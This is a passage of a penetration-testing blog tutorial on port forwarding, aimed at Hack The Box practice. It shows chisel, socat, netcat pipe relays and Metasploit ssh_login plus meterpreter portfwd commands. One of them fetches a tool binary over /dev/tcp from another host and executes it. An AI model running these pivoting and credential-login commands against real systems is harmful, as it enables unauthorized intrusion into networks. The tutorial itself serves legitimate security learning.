      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>ust@ubuntu:~/tmp<span class="nv">$ </span><span class="nb">cat</span> &lt; /dev/tcp/192.168.164.133/6666 <span class="o">&gt;</span> chisel
ust@ubuntu:~/tmp<span class="nv">$ </span><span class="nb">chmod </span>755 chisel
ust@ubuntu:~/tmp<span class="nv">$ </span>./chisel client 192.168.164.133:8002 R:127.0.0.1:8000
</pre></td></tr></tbody></table></code></div></div>

<p><img data-src="http://localhost:4000\assets\images\tutorials\PortForwarding\20220310134836.png" alt="image-center" class="align-center" data-proofer-ignore></p>

<p>Then we will be able to reach the remote HTTP server in our localhost port 8000.</p>

<h2 id="socat"><span class="mr-2">Socat</span><a href="#socat" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>

<div class="language-sh highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>root@kali:~/tools<span class="nv">$ </span>socat TCP-LISTEN:localport,fork,reuseaddr TCP:remoteIP:remoteport
root@kali:~/tools<span class="nv">$ </span>socat TCP-LISTEN:10000,fork,reuseaddr TCP:192.168.164.130:8000
</pre></td></tr></tbody></table></code></div></div>

<h2 id="netcat"><span class="mr-2">Netcat</span><a href="#netcat" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
<div class="language-sh highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>root@kali:~/tools<span class="nv">$ </span><span class="nb">mknod </span>pivot p
root@kali:~/tools<span class="nv">$ </span>nc <span class="nt">-l</span> <span class="nt">-p</span> 12000 0&lt;pivot | nc 192.168.164.130 8000 1&gt;pivot
</pre></td></tr></tbody></table></code></div></div>

<h2 id="msfconsole--meterpreter"><span class="mr-2">Msfconsole / meterpreter</span><a href="#msfconsole--meterpreter" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>Use auxiliary/scanner/ssh/ssh_login module to create a session</p>

<div class="language-sh highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>root@kali:~/tools<span class="nv">$ </span>msfconsole
msf5 use auxiliary/scanner/ssh/ssh_login
msf5 auxiliary<span class="o">(</span>scanner/ssh/ssh_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhosts 192.168.164.130
msf5 auxiliary<span class="o">(</span>scanner/ssh/ssh_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>username victim
msf5 auxiliary<span class="o">(</span>scanner/ssh/ssh_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>password pass
msf5 auxiliary<span class="o">(</span>scanner/ssh/ssh_login<span class="o">)</span> <span class="o">&gt;</span> exploit 
msf5 auxiliary<span class="o">(</span>scanner/ssh/ssh_login<span class="o">)</span> <span class="o">&gt;</span> sessions <span class="nt">-l</span> 
msf5 auxiliary<span class="o">(</span>scanner/ssh/ssh_login<span class="o">)</span> <span class="o">&gt;</span> sessions <span class="nt">-u</span> ‘id’
msf5 auxiliary<span class="o">(</span>scanner/ssh/ssh_login<span class="o">)</span> <span class="o">&gt;</span> sessions <span class="nt">-i</span> ‘id’
</pre></td></tr></tbody></table></code></div></div>

<p>Once connected, use the meterpreter session opened and do the port forwarding:</p>

<div class="language-sh highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>meterpreter <span class="o">&gt;</span> portfwd <span class="nt">-h</span>
meterpreter <span class="o">&gt;</span> portfwd add <span class="nt">-l</span> 1234 <span class="nt">-p</span> 8000 <span class="nt">-r</span> 192.168.164.130
meterpreter <span class="o">&gt;</span> portfwd list
</pre></td></tr></tbody></table></code></div></div>

<p><img data-src="http://localhost:4000\assets\images\tutorials\PortForwarding\20220310135630.png" alt="image-center" class="align-center" data-proofer-ignore></p>

<h2 id="practice"><span class="mr-2">Practice</span><a href="#practice" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
<p>If you want to practice the techniques and tools explained in this post, you can make the following hack the box machines:</p>

<ul>
  <li>Granny</li>
  <li>Grandpa</li>
  <li>Vault</li>
  <li>Reddish</li>
</ul>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  
  <div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i>
    
      <a href='/categories/tutorials/'>Tutorials</a>,
      <a href='/categories/port-forwarding/'>Port Forwarding</a>
  </div>
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/ssh/"
          class="post-tag no-text-decoration" >ssh</a>
      
      <a href="/tags/chisel/"
          class="post-tag no-text-decoration" >chisel</a>
      
      <a href="/tags/socat/"
          class="post-tag no-text-decoration" >socat</a>
      
      <a href="/tags/netcat/"
          class="post-tag no-text-decoration" >netcat</a>
      
      <a href="/tags/msf/"
          class="post-tag no-text-decoration" >msf</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Basic Port Forwarding Techniques - MikeMightHackMe&amp;url=http://localhost:4000/posts/PortForwarding/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Basic Port Forwarding Techniques - MikeMightHackMe&amp;u=http://localhost:4000/posts/PortForwarding/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://t.me/share/url?url=http://localhost:4000/posts/PortForwarding/&amp;text=Basic Port Forwarding Techniques - MikeMightHackMe" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        data-title-succeed="Link copied successfully!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->


      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- pannel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















      















  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/apk/">apk</a>
    
      
      <a class="post-tag" href="/tags/chisel/">chisel</a>
    
      
      <a class="post-tag" href="/tags/command-injection/">command injection</a>
    
      
      <a class="post-tag" href="/tags/cve-2021-3156/">CVE-2021-3156</a>
    
      
      <a class="post-tag" href="/tags/msf/">msf</a>
    
      
      <a class="post-tag" href="/tags/netcat/">netcat</a>
    
      
      <a class="post-tag" href="/tags/socat/">socat</a>
    
      
      <a class="post-tag" href="/tags/ssh/">ssh</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
      
        
        <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  
    
  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->




  
    
    
  
    
    
      
      
        
        
        
      
    
  





  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/RouterSpace/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
-->

<em class="timeago small"
    data-ts="1646735280"
    
    >
  2022-03-08
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Router Space HTB Walkthrough </h3>
            <div class="text-muted small">
              <p>
                





                Initial Foothold

We start with a basic nmap. We see that we have port 22 (ssh) and 80 (http) open.


On port 80, we find the following web application:


The download button will download an apk f...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


      
        
        <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/RouterSpace/" class="btn btn-outline-primary"
    prompt="Older">
    <p>Router Space HTB Walkthrough </p>
  </a>
  

  
  <span class="btn btn-outline-primary disabled"
    prompt="Newer">
    <p>-</p>
  </span>
  

</div>

      
        
        <!--  The comments switcher -->


      
    </div>
  </div>
</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center text-muted">
    <div class="footer-left">
      <p class="mb-0">
        © 2022
        <a href="https://twitter.com/GLMicky">Miguel Guerrero</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        

        

        Powered by 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
         with 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
         theme.

      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/apk/">apk</a>
    
      
      <a class="post-tag" href="/tags/chisel/">chisel</a>
    
      
      <a class="post-tag" href="/tags/command-injection/">command injection</a>
    
      
      <a class="post-tag" href="/tags/cve-2021-3156/">CVE-2021-3156</a>
    
      
      <a class="post-tag" href="/tags/msf/">msf</a>
    
      
      <a class="post-tag" href="/tags/netcat/">netcat</a>
    
      
      <a class="post-tag" href="/tags/socat/">socat</a>
    
      
      <a class="post-tag" href="/tags/ssh/">ssh</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    
      <!--
  mermaid-js loader
-->

<script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script>

<script>
  $(function() {
    function updateMermaid(event) {
      if (event.source === window && event.data &&
            event.data.direction === ModeToggle.ID) {

        const mode = event.data.message;

        if (typeof mermaid === "undefined") {
          return;
        }

        let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default");
        let config = { theme: expectedTheme };

        /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */
        $(".mermaid").each(function() {
          let svgCode = $(this).prev().children().html();
          $(this).removeAttr("data-processed");
          $(this).html(svgCode);
        });

        mermaid.initialize(config);
        mermaid.init(undefined, ".mermaid");
      }
    }

    let initTheme = "default";

    if ($("html[data-mode=dark]").length > 0
      || ($("html[data-mode]").length == 0
        && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) {
      initTheme = "dark";
    }

    let mermaidConf = {
      theme: initTheme  /* <default|dark|forest|neutral> */
    };

    /* Markdown converts to HTML */
    $("pre").has("code.language-mermaid").each(function() {
      let svgCode = $(this).children().html();
      $(this).addClass("unloaded");
      $(this).after(`<div class=\"mermaid\">${svgCode}</div>`);
    });

    mermaid.initialize(mermaidConf);

    window.addEventListener("message", updateMermaid);
  });
</script>

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>







  

  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script>








<script defer src="/assets/js/dist/post.min.js"></script>


  <!-- MathJax -->
  <script>
  /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */
  MathJax = {
    tex: {
      inlineMath: [              /* start/end delimiter pairs for in-line math */
        ['$','$'],
        ['\\(','\\)']
      ],
      displayMath: [             /* start/end delimiter pairs for display math */
        ['$$', '$$'],
        ['\\[', '\\]']
      ]
    }
  };
  </script>
  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
  </script>


<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

